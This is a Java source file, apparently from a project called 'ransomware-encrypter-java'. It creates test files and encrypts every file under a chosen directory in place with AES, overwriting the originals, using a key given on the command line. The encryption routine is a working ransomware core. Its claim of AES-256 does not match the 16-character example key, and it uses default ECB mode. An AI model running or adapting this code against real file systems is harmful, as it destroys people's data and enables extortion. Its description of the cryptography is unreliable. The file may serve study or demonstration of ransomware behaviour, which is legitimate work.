// Compile: javac src/main/java/dev/danieljancar/App.java
// Run: java -cp src/main/java dev.danieljancar.App <mode> <args>
// Example Key: puXNg6ReJpwi4FeA (16 characters)

package dev.danieljancar;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.util.Date;
import java.util.Random;

/**
 * Main class for file manipulation including creation, encryption, or both.
 * Supports various modes specified through command-line arguments.
 *
 * @version 1.0
 */
public class App {
    public static void main(String[] args) {
        validateArgs(args);

    }


    /**
     * Validates command-line arguments and triggers the appropriate action.
     * Supported modes: create, encrypt, both, help.
     *
     * @param args Command-line arguments specifying mode and other parameters.
     * @throws IllegalArgumentException if arguments are invalid or insufficient.
     */
    private static void validateArgs(String[] args) {
        if (args.length < 1 || args.length > 5) {
            System.out.println("Not enough arguments");
            throw new IllegalArgumentException("Not enough arguments");
        }
        String mode = args[0];

        switch (mode) {
            case "create" -> {
                System.out.println("Creator mode selected");
                String path = args[1];
                int amount = Integer.parseInt(args[2]);
                String fileEnding = args[3];
                System.out.println("Path: " + path);
                System.out.println("Amount: " + amount);
                System.out.println("File ending: " + fileEnding);
                createFiles(path, amount, fileEnding);
            }
            case "encrypt" -> {
                System.out.println("Encrypt mode selected");
                String path = args[1];
                String key = args[2];
                System.out.println("Path: " + path);
                System.out.println("Key: " + key);
                encryptFiles(path, key);
            }
            case "both" -> {
                System.out.println("Both mode selected");
                String path = args[1];
                int amount = Integer.parseInt(args[2]);
                String fileEnding = args[3];
                String key = args[4];
                System.out.println("Path: " + path);
                System.out.println("Amount: " + amount);
                System.out.println("File ending: " + fileEnding);
                System.out.println("Key: " + key);
                createAndEncryptFiles(path, amount, fileEnding, key);
            }
            case "help" -> {
                System.out.println("Help mode selected");
                System.out.println("Usage:");
                System.out.println("- Create files: App create <path> <amount> <file ending>");
                System.out.println("- Encrypt files: App encrypt <path> <key>");
                System.out.println("- Create and encrypt files: App both <path> <amount> <file ending> <key>");
                System.out.println("- More: https://github.com/danieljancar/ransomware-encrypter-java");
            }
            case null, default -> {
                throw new IllegalArgumentException("Invalid mode selected");
            }
        }
    }

    /**
     * Creates a specified number of files with random data in a given directory.
     *
     * @param path       The directory where files will be created.
     * @param amount     The number of files to create.
     * @param fileEnding The file extension for the created files.
     */
    private static void createFiles(String path, int amount, String fileEnding) {
        Date start = new Date();
        try {
            File directory = new File(path);
            if (!directory.exists()) {
                directory.mkdirs();
            }

            for (int i = 0; i < amount; i++) {
                File file = new File(directory, "file" + i + "." + fileEnding);
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                    writer.write(generateRandomData());
                }
            }
            Date end = new Date();
            System.out.println("Created " + amount + " files in " + (end.getTime() - start.getTime()) + " ms");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * Generates a string of random alphanumeric characters.
     *
     * @return A string of random data.
     */
    private static String generateRandomData() {
        int length = 1024;
        StringBuilder data = new StringBuilder(length);
        Random random = new Random();
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (int i = 0; i < length; i++) {
            data.append(characters.charAt(random.nextInt(characters.length())));
        }

        return data.toString();
    }

    /**
     * Encrypts a single file using AES-256 encryption.
     *
     * @param filePath The path of the file to be encrypted.
     * @param cipher   The cipher instance used for encryption.
     * @param key      The secret key used for encryption.
     */
    private static void encryptFile(Path filePath, Cipher cipher, SecretKey key) {
        try {
            cipher.init(Cipher.ENCRYPT_MODE, key);

            byte[] fileContent = Files.readAllBytes(filePath);
            byte[] encryptedContent = cipher.doFinal(fileContent);

            Files.write(filePath, encryptedContent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Encrypts all files in a specified directory using AES-256 encryption.
     *
     * @param path      The directory containing the files to encrypt.
     * @param keyString The encryption key as a string.
     */
    private static void encryptFiles(String path, String keyString) {
        Date start = new Date();
        try {
            SecretKey key = new SecretKeySpec(keyString.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES");

            Files.walk(Paths.get(path))
                    .filter(Files::isRegularFile)
                    .forEach(file -> encryptFile(file, cipher, key));
            Date end = new Date();
            System.out.println("Encrypted all files in " + (end.getTime() - start.getTime()) + " ms");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Creates and then encrypts files in a specified directory.
     *
     * @param path       The directory where files will be created and encrypted.
     * @param amount     The number of files to create.
     * @param fileEnding The file extension for the created files.
     * @param key        The encryption key as a string.
     */
    private static void createAndEncryptFiles(String path, int amount, String fileEnding, String key) {
        createFiles(path, amount, fileEnding);
        encryptFiles(path, key);
    }
}